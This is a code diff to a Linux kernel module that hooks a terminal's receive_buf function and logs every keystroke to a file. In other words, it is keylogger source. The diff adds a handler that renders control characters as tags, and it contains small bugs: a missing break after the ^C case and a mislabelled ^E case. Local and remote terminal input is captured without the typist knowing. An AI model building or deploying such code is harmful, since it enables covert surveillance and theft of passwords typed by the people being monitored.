@@ -18,6 +18,8 @@ MODULE_LICENSE("GPL");
 // backspace chars
 #define BACKSPACE_1 127 //local
 #define BACKSPACE_2 8 // remote
+// escape char
+#define ESC_CHAR 27
 
 // our log file
 struct file* logfile;
@@ -32,7 +34,7 @@ struct logger {
 struct logger* logger;
 
 // functions for our logging, aka appending and resetting
-void append_char(char* source, size_t count){
+void append_c(char* source, size_t count){
   if((logger->pos + count) > (MAX_BUFFER + MAX_SPECIAL_CHAR_SIZE)){
     // prevent overflow
     return;
@@ -49,6 +51,96 @@ void reset_logger(){
   }
 }
 
+// handles all possible single char characters
+void handle_single_char(char* cp){
+  switch(cp[0]){
+  case 0x01:	//^A
+    append_c("[^A]", 4);
+    break;
+  case 0x02:	//^B
+    append_c("[^B]", 4);
+    break;
+  case 0x03:	//^C
+    append_c( "[^C]", 4);
+  case 0x04:	//^D
+    append_c("[^D]", 4);
+    break;
+  case 0x05:	//^E
+    append_c("[^E]", 4);
+    break;
+  case 0x06:	//^F
+    append_c("[^F]", 4);
+    break;
+  case 0x07:	//^G
+    append_c("[^G]", 4);
+    break;
+  case 0x09:	//TAB - ^I
+    append_c("[TAB]", 5);
+    break;
+  case 0x0b:	//^K
+    append_c("[^K]", 4);
+    break;
+  case 0x0c:	//^L
+    append_c("[^L]", 4);
+    break;
+  case 0x0e:	//^E
+    append_c("[^E]", 4);
+    break;
+  case 0x0f:	//^O
+    append_c("[^O]", 4);
+    break;
+  case 0x10:	//^P
+    append_c("[^P]", 4);
+    break;
+  case 0x11:	//^Q
+    append_c("[^Q]", 4);
+    break;
+  case 0x12:	//^R
+    append_c("[^R]", 4);
+    break;
+  case 0x13:	//^S
+    append_c("[^S]", 4);
+    break;
+  case 0x14:	//^T
+    append_c("[^T]", 4);
+    break;
+  case 0x15:	//CTRL-U, deletes everything
+    reset_logger();
+    break;
+  case 0x16:	//^V
+    append_c("[^V]", 4);
+    break;
+  case 0x17:	//^W
+    append_c("[^W]", 4);
+    break;
+  case 0x18:	//^X
+    append_c("[^X]", 4);
+    break;
+  case 0x19:	//^Y
+    append_c("[^Y]", 4);
+    break;
+  case 0x1a:	//^Z
+    append_c("[^Z]", 4);
+    break;
+  case 0x1c:	//^					\
+    append_c("[^\\]", 4);
+    break;
+  case 0x1d:	//^]
+    append_c("[^]]", 4);
+    break;
+  case 0x1e:	//^^
+    append_c("[^^]", 4);
+    break;
+  case 0x1f:	//^_
+    append_c("[^_]", 4);
+    break;
+  case ESC_CHAR:	//ESC
+    append_c("[ESC]", 5);
+    break;
+  default:
+    append_c((char*)cp,1);
+  }
+}
 // pointer to the old receive_buf function
 void (*old_receive_buf)(struct tty_struct*,const unsigned char*,
 			char*,int);
@@ -72,7 +164,8 @@ void new_receive_buf(struct tty_struct* tty, const unsigned char* cp,
 	}
       }else{
 	// otherwise, add the char
-	append_char((char*)cp,1);
+	handle_single_char((char*)cp);
+	//append_c((char*)cp,1);
 
 	// check if the user pressed enter
 	if(cp[0] == 0x0D ||
